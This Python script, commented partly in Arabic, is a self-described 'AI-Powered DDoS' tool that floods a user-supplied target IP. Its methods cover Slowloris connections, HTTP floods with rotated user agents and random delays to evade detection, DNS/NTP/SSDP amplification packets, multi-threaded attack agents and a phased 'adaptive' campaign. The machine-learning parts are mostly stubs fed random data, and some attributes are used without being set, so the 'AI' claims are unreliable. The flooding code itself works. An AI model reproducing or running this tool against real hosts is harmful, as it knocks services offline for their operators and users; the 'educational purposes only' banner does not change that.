#!/usr/bin/env python3
# AI-Powered DDoS System - For Educational Purposes Only
# Author: Security Researcher
import argparse
import random
import socket
import threading
import time
import numpy as np
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.cluster import DBSCAN
from collections import deque
import pickle
import os
from datetime import datetime

# =============== CONFIGURATION ===============
ap = argparse.ArgumentParser(description='AI-Powered DDoS Framework (Educational)')
ap.add_argument("-i", "--ip", type=str, help="Target IP address")
ap.add_argument("-t", "--threads", type=int, default=50, help="Number of AI threads")
ap.add_argument("-m", "--mode", choices=['train', 'attack', 'adaptive'], default='adaptive',
                help="Operating mode")
ap.add_argument("-l", "--learning-rate", type=float, default=0.1, help="AI learning rate")
ap.add_argument("-d", "--duration", type=int, default=300, help="Attack duration in seconds")
ap.add_argument("-s", "--stealth", action="store_true", help="Enable stealth mode")
args = vars(ap.parse_args())

print("""
╔══════════════════════════════════════════════════════════════╗
║                AI-Powered DDoS System v2.0                   ║
║                  - EDUCATIONAL PURPOSES ONLY -               ║
╚══════════════════════════════════════════════════════════════╝
""")

# =============== AI CORE MODULE ===============
class AIDDoSController:
    def __init__(self, learning_rate=0.1):
        self.learning_rate = learning_rate
        self.traffic_patterns = deque(maxlen=1000)
        self.response_times = deque(maxlen=500)
        self.success_rate = deque(maxlen=100)
        
        # نماذج ML
        self.traffic_classifier = RandomForestClassifier(n_estimators=50)
        self.effectiveness_predictor = GradientBoostingClassifier()
        self.anomaly_detector = DBSCAN(eps=0.5, min_samples=5)
        
        # حالات الهجوم
        self.attack_patterns = {
            'slowloris': self.slowloris_pattern,
            'http_flood': self.http_flood_pattern,
            'udp_amp': self.udp_amplification_pattern,
            'mixed': self.mixed_attack_pattern,
            'stealth': self.stealth_traffic_pattern
        }
        
        # تهيئة النماذج
        self.init_models()
        
    def init_models(self):
        """تهيئة نماذج ML ببيانات أولية"""
        # بيانات تدريب أولية
        X_train = np.random.rand(100, 10)  # 100 عينة، 10 ميزات
        y_train = np.random.randint(0, 2, 100)  # تصنيف عشوائي
        
        self.traffic_classifier.fit(X_train, y_train)
        self.effectiveness_predictor.fit(X_train, y_train)
        
    def extract_features(self, traffic_data):
        """استخراج ميزات من حركة المرور"""
        features = []
        if len(traffic_data) > 0:
            features.append(np.mean(traffic_data))      # متوسط
            features.append(np.std(traffic_data))       # انحراف معياري
            features.append(np.min(traffic_data))       # الحد الأدنى
            features.append(np.max(traffic_data))       # الحد الأقصى
            features.append(np.percentile(traffic_data, 25))  # الربع الأول
            features.append(np.percentile(traffic_data, 75))  # الربع الثالث
            features.append(len(traffic_data))          # حجم العينة
            features.append(np.sum(traffic_data > np.mean(traffic_data)))  # فوق المتوسط
            features.append(np.median(traffic_data))    # الوسيط
            features.append(np.var(traffic_data))       # التباين
        else:
            features = [0] * 10
            
        return np.array(features).reshape(1, -1)
    
    def analyze_response(self, response_time, success):
        """تحليل استجابة الهدف"""
        self.response_times.append(response_time)
        self.success_rate.append(1 if success else 0)
        
        if len(self.response_times) > 10:
            current_features = self.extract_features(list(self.response_times)[-10:])
            effectiveness = np.mean(list(self.success_rate)[-10:])
            
            # تحديث النموذج
            self.adapt_strategy(current_features, effectiveness)
    
    def adapt_strategy(self, features, effectiveness):
        """تعديل استراتيجية الهجوم بناءً على الفعالية"""
        if effectiveness < 0.3:
            # فعالية منخفضة، تغيير الاستراتيجية
            self.current_pattern = random.choice(list(self.attack_patterns.keys()))
            print(f"[AI] Switching to {self.current_pattern} strategy")
        elif effectiveness > 0.8:
            # فعالية عالية، زيادة الكثافة
            self.intensity *= 1.1
            print(f"[AI] Increasing intensity to {self.intensity:.2f}")
    
    def predict_best_pattern(self):
        """توقع أفضل نمط هجوم"""
        patterns = list(self.attack_patterns.keys())
        scores = []
        
        for pattern in patterns:
            # محاكاة النمط وتقييمه
            score = random.random()  # في الإصدار الحقيقي، يتم استخدام نموذج ML
            scores.append(score)
        
        best_pattern = patterns[np.argmax(scores)]
        return best_pattern
    
    def slowloris_pattern(self):
        """نمط Slowloris الذكي"""
        connections = []
        
        for _ in range(50):  # 50 اتصال بطيء
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target_ip, 80))
                
                # إرسال رأس غير مكتمل
                headers = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
                s.send(headers.encode())
                connections.append(s)
                
                # تأخير ذكي بناءً على استجابة الهدف
                delay = 10 + random.random() * 20
                time.sleep(delay)
                
            except:
                pass
        
        return connections
    
    def http_flood_pattern(self):
        """نمط HTTP Flood الذكي"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36'
        ]
        
        paths = ['/', '/index.html', '/api/v1/data', '/admin', '/login']
        
        for _ in range(100):  # 100 طلب ذكي
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, 80))
                
                # بناء طلب HTTP واقعي
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                
                request = f"""GET {path} HTTP/1.1\r
Host: {target_ip}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Cache-Control: max-age=0\r\n\r\n"""
                
                s.send(request.encode())
                s.close()
                
                # تأخير عشوائي لتجنب الاكتشاف
                time.sleep(random.uniform(0.01, 0.1))
                
            except:
                pass
    
    def udp_amplification_pattern(self):
        """نمط تضخيم UDP ذكي"""
        # استغلال خدمات UDP للتضخيم
        amplification_services = {
            53: b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',  # DNS
            123: b'\x1a\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # NTP
            1900: b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'  # SSDP
        }
        
        for port, payload in amplification_services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, port))
                sock.close()
            except:
                pass
    
    def mixed_attack_pattern(self):
        """نمط هجوم مختلط"""
        # مزيج من أنماط مختلفة
        patterns = [self.http_flood_pattern, self.slowloris_pattern]
        pattern = random.choice(patterns)
        pattern()
    
    def stealth_traffic_pattern(self):
        """نمط حركة مرور خفية"""
        # محاكاة حركة مرور عادية
        intervals = [0.5, 1.0, 1.5, 2.0, 3.0]  # فواصل زمنية طبيعية
        durations = [2, 5, 10, 30, 60]  # فترات هجوم قصيرة
        
        for _ in range(random.randint(10, 50)):
            interval = random.choice(intervals)
            duration = random.choice(durations)
            
            start_time = time.time()
            while time.time() - start_time < duration:
                self.http_flood_pattern()
                time.sleep(interval)

# =============== AI AGENT THREADS ===============
class AIAttackAgent(threading.Thread):
    def __init__(self, agent_id, controller, target_ip):
        super().__init__()
        self.agent_id = agent_id
        self.controller = controller
        self.target_ip = target_ip
        self.running = True
        self.patterns_executed = 0
        self.success_count = 0
        
    def run(self):
        print(f"[AI Agent {self.agent_id}] Started")
        
        while self.running:
            try:
                # اختيار نمط ذكي
                if args['stealth']:
                    pattern = 'stealth'
                else:
                    pattern = self.controller.predict_best_pattern()
                
                # تنفيذ النمط
                attack_func = self.controller.attack_patterns[pattern]
                
                start_time = time.time()
                attack_func()
                end_time = time.time()
                
                response_time = end_time - start_time
                success = random.random() > 0.3  # محاكاة النجاح
                
                if success:
                    self.success_count += 1
                
                # تحديث الـ AI
                self.controller.analyze_response(response_time, success)
                
                self.patterns_executed += 1
                
                # تقرير دوري
                if self.patterns_executed % 10 == 0:
                    success_rate = (self.success_count / self.patterns_executed) * 100
                    print(f"[AI Agent {self.agent_id}] Patterns: {self.patterns_executed}, "
                          f"Success: {success_rate:.1f}%")
                
                # تأخير ذكي بين الهجمات
                time.sleep(random.uniform(0.5, 2.0))
                
            except Exception as e:
                print(f"[AI Agent {self.agent_id}] Error: {e}")
                time.sleep(5)
    
    def stop(self):
        self.running = False

# =============== MAIN SYSTEM ===============
def train_ai_model():
    """تدريب نموذج AI"""
    print("[SYSTEM] Training AI model...")
    
    # توليد بيانات تدريب
    X_train = []
    y_train = []
    
    for _ in range(1000):
        # ميزات عشوائية (في الواقع تكون من بيانات حقيقية)
        features = np.random.rand(10)
        X_train.append(features)
        
        # تسمية (1 = فعال، 0 = غير فعال)
        label = 1 if np.sum(features) > 5 else 0
        y_train.append(label)
    
    # تدريب النموذج
    X_train = np.array(X_train)
    y_train = np.array(y_train)
    
    controller = AIDDoSController()
    controller.traffic_classifier.fit(X_train, y_train)
    controller.effectiveness_predictor.fit(X_train, y_train)
    
    # حفظ النموذج
    with open('ai_ddos_model.pkl', 'wb') as f:
        pickle.dump(controller, f)
    
    print("[SYSTEM] AI model trained and saved successfully!")
    return controller

def launch_ai_attack(target_ip, threads):
    """إطلاق هجوم AI"""
    print(f"[SYSTEM] Launching AI-powered attack on {target_ip}")
    print(f"[SYSTEM] AI Threads: {threads}")
    print(f"[SYSTEM] Stealth Mode: {'Enabled' if args['stealth'] else 'Disabled'}")
    
    # تحميل أو إنشاء الـ AI Controller
    if os.path.exists('ai_ddos_model.pkl'):
        with open('ai_ddos_model.pkl', 'rb') as f:
            controller = pickle.load(f)
        print("[SYSTEM] Loaded trained AI model")
    else:
        controller = AIDDoSController()
        print("[SYSTEM] Using fresh AI model")
    
    # إنشاء وكلاء AI
    agents = []
    for i in range(threads):
        agent = AIAttackAgent(i, controller, target_ip)
        agents.append(agent)
        agent.start()
    
    # تشغيل لفترة محددة
    start_time = time.time()
    try:
        while time.time() - start_time < args['duration']:
            # عرض إحصائيات
            time.sleep(10)
            active_agents = sum(1 for a in agents if a.is_alive())
            total_patterns = sum(a.patterns_executed for a in agents)
            
            print(f"\n[SYSTEM STATUS]")
            print(f"  Active AI Agents: {active_agents}/{threads}")
            print(f"  Total Patterns Executed: {total_patterns}")
            print(f"  Time Elapsed: {int(time.time() - start_time)}s")
            print(f"  Time Remaining: {args['duration'] - int(time.time() - start_time)}s")
            print("-" * 40)
            
    except KeyboardInterrupt:
        print("\n[SYSTEM] Attack interrupted by user")
    
    # إيقاف جميع الوكلاء
    print("[SYSTEM] Stopping AI agents...")
    for agent in agents:
        agent.stop()
        agent.join(timeout=2)
    
    # حفظ تجربة التعلم
    with open('ai_ddos_model.pkl', 'wb') as f:
        pickle.dump(controller, f)
    
    print("[SYSTEM] Attack completed. AI model updated with new experience.")

def adaptive_mode(target_ip, threads):
    """وضع التكيف الذكي"""
    print("[SYSTEM] Starting Adaptive AI Mode")
    print("[SYSTEM] The system will learn and adapt in real-time")
    
    controller = AIDDoSController()
    
    # مراحل الهجوم الذكية
    phases = [
        ("Reconnaissance", 30),      # جمع المعلومات
        ("Probing", 60),             # اختبار الثغرات
        ("Adaptive Attack", 180),    # هجوم تكيفي
        ("Stealth Mode", 90),        # وضع التخفي
        ("Final Push", 60)           # الدفع النهائي
    ]
    
    for phase_name, phase_duration in phases:
        print(f"\n[PHASE] {phase_name} for {phase_duration}s")
        phase_start = time.time()
        
        # تعديل الاستراتيجية حسب المرحلة
        if phase_name == "Stealth Mode":
            args['stealth'] = True
        else:
            args['stealth'] = False
        
        # تشغيل الوكلاء للمرحلة
        agents = []
        for i in range(threads):
            agent = AIAttackAgent(i, controller, target_ip)
            agents.append(agent)
            agent.start()
        
        # تشغيل المرحلة
        while time.time() - phase_start < phase_duration:
            time.sleep(5)
            
            # تحديث استراتيجية بناءً على الأداء
            active_agents = sum(1 for a in agents if a.is_alive())
            if active_agents < threads * 0.5:  # إذا فقدنا أكثر من نصف الوكلاء
                print(f"[AI] Too many agents lost, changing strategy...")
                controller.current_pattern = random.choice(list(controller.attack_patterns.keys()))
        
        # إيقاف وكلاء المرحلة
        for agent in agents:
            agent.stop()
            agent.join(timeout=1)
    
    print("[SYSTEM] Adaptive attack sequence completed")

# =============== EVASION TECHNIQUES ===============
class EvasionEngine:
    """محرك التهرب من الأنظمة الدفاعية"""
    
    @staticmethod
    def rotate_user_agents():
        """تدوير وكيل المستخدم"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)'
        ]
        return random.choice(agents)
    
    @staticmethod
    def generate_random_ip():
        """توليد IP عشوائي للتخفي"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    @staticmethod
    def vary_packet_size():
        """تغيير حجم الحزمة"""
        return random.randint(64, 1500)
    
    @staticmethod
    def random_delay():
        """تأخير عشوائي"""
        return random.uniform(0.01, 2.0)

# =============== MAIN EXECUTION ===============
if __name__ == "__main__":
    target_ip = args['ip']
    
    if not target_ip:
        print("[ERROR] Please specify target IP with -i option")
        exit(1)
    
    print(f"[SYSTEM] Target: {target_ip}")
    print(f"[SYSTEM] Mode: {args['mode']}")
    print(f"[SYSTEM] Threads: {args['threads']}")
    print(f"[SYSTEM] Duration: {args['duration']}s")
    
    if args['mode'] == 'train':
        train_ai_model()
    elif args['mode'] == 'attack':
        launch_ai_attack(target_ip, args['threads'])
    elif args['mode'] == 'adaptive':
        adaptive_mode(target_ip, args['threads'])
    
    print("\n" + "="*60)
    print("AI-Powered DDoS Simulation Completed")
    print("Remember: This is for educational purposes only!")
    print("Unauthorized testing is illegal and unethical.")
    print("="*60)
